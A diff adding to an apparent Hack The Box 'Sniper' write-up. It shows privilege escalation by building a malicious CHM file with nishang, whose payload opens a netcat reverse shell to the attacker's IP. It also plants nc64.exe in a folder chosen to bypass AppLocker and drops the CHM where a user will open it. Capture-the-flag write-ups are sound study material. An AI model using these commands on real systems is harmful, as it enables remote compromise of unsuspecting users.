@@ -9,7 +9,7 @@ menu:
     parent: htb-machines-windows
     weight: 10
 hero: images/sniper.png
-tags: ["HTB"]
+tags: ["HTB", "lfi", "rfi", "impacket-smbserver", "log-poisoning", "powershell", "webshell", "powershell-run-as", "chm", "nishang"]
 ---
 
 # Sniper
@@ -313,4 +313,82 @@ c:\Docs>
 
 ```
 
-- Looks
+- Looks like if we drop `.chm` file to `c:/Docs` folder, it will be opened
+  - We can use https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1 to create a malicious `.chm` and drop it to `Docs`
+  - Let's do it
+
+```
+PS D:\VMs\Shared> Out-CHM -Payload "\windows\system32\spool\drivers\color\nc64.exe -e cmd 10.10.16.9 8888" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
+Microsoft HTML Help Compiler 4.74.8702
+
+Compiling d:\VMs\Shared\doc.chm
+
+
+Compile time: 0 minutes, 0 seconds
+2       Topics
+4       Local links
+4       Internet links
+0       Graphics
+
+
+Created d:\VMs\Shared\doc.chm, 13,458 bytes
+Compression increased file by 265 bytes.
+```
+- Now we have to save `nc` to folder to bypass `Applocker`
+  - https://book.hacktricks.xyz/windows-hardening/authentication-credentials-uac-and-efs#bypass
+
+```
+PS C:\Users\Chris\Downloads> iwr 10.10.16.9/nc64.exe -outfile c:\windows\system32\spool\drivers\color\nc64.exe
+iwr 10.10.16.9/nc64.exe -outfile c:\windows\system32\spool\drivers\color\nc64.exe
+PS C:\Users\Chris\Downloads> ls \windows\system32\spool\drivers\color\nc64.exe
+ls \windows\system32\spool\drivers\color\nc64.exe
+
+
+    Directory: C:\windows\system32\spool\drivers\color
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----        9/16/2023  11:16 AM          45272 nc64.exe
+```
+
+- Now, let's upload the `.chm` file and save it to `C:/Docs`
+
+```
+PS C:\Users\Chris\Downloads> iwr 10.10.16.9/doc.chm -outfile doc.chm
+iwr 10.10.16.9/doc.chm -outfile doc.chm
+PS C:\Users\Chris\Downloads> ls
+ls
+
+
+    Directory: C:\Users\Chris\Downloads
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----        9/16/2023  11:16 AM          13458 doc.chm                                                               
+-a----        4/11/2019   8:36 AM          10462 instructions.chm                                                      
+
+
+PS C:\Users\Chris\Downloads> copy doc.chm \Docs
+copy doc.chm \Docs
+PS C:\Users\Chris\Downloads> ls \Docs
+ls \Docs
+
+
+    Directory: C:\Docs
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----        9/16/2023  11:16 AM          13458 doc.chm                                                               
+-a----        4/11/2019   9:31 AM            285 note.txt                                                              
+-a----        4/11/2019   9:17 AM         552607 php for dummies-trial.pdf                                             
+```
+
+- After few minutes, we have our connection
+
+![](./images/7.png)
+
+## Alternative path to Foothold
+- Check [0xdf](https://0xdf.gitlab.io/2020/03/28/htb-sniper.html#path-1---lfi) and [Ippsec](https://www.youtube.com/watch?v=k7gD4ufex9Q&list=PLidcsTyj9JXI9E9dT1jgXxvTOi7Pq_2c5&index=15) for `LFI` exploit chain to get a foothold
